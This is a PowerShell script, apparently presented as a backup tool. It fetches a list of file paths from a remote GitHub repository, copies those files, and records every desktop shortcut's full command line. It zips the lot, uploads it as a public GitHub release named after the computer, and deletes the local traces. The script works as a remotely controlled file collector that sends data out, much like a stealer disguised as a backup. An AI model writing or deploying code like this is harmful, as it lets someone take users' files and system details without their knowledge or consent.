[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "rtyuiuiop/1"
$token = $env:GITHUB_TOKEN
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$apiUrl = "https://api.github.com/repos/$repo/releases"
$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"

try {
    $paths = Invoke-WebRequest -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    $paths = $paths -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    Write-Host "✅ 成功获取路径列表："
    $paths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法获取路径配置文件：$($_.Exception.Message)"
    exit 1
}

$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# === ⬇️ 拷贝文件 ===
foreach ($path in $paths) {
    if (Test-Path $path) {
        try {
            $relative = $path -replace "^[A-Z]:\\", "" -replace "[:\\]", "_"
            $dest = Join-Path $workDir $relative
            New-Item -ItemType Directory -Path (Split-Path $dest) -Force -ErrorAction SilentlyContinue | Out-Null
            Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Warning "⚠️ 无法复制：$path"
        }
    } else {
        Write-Warning "❌ 路径不存在：$path"
    }
}

# === ⬇️ 新增：提取桌面快捷方式完整路径（含参数） ===
try {
    $desktopDirs = @(
        "$env:USERPROFILE\Desktop",
        "$env:PUBLIC\Desktop"
    )
    $lnkInfo = ""
    foreach ($dir in $desktopDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -Filter *.lnk -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $shell = New-Object -ComObject WScript.Shell
                    $shortcut = $shell.CreateShortcut($_.FullName)
                    $fullCmd = "`"$($shortcut.TargetPath)`" $($shortcut.Arguments)"
                    $lnkInfo += "$($_.Name)`n$fullCmd`n`n"
                } catch {
                    $lnkInfo += "$($_.Name)`n[Failed to parse]`n`n"
                }
            }
        }
    }
    if ($lnkInfo) {
        $lnkInfo | Out-File -FilePath (Join-Path $workDir "lnk_full_paths.txt") -Encoding UTF8
        Write-Host "🧷 已生成桌面快捷方式路径 lnk_full_paths.txt"
    }
} catch {
    Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
}

# === ⬇️ 压缩上传 ===
$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

$releaseBody = @{
    tag_name   = $tag
    name       = "Backup $tag"
    body       = "自动上传的备份文件"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $releaseBody
    if ($response.upload_url) {
        $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
        $uploadHeaders = @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
        }
        Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
        Write-Host "`n✅ 上传成功：$tag.zip"
    } else {
        Write-Host "❌ 创建 Release 失败：$($response | ConvertTo-Json -Depth 5)"
    }
} catch {
    Write-Warning "❌ 上传过程出错：$($_.Exception.Message)"
}

Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
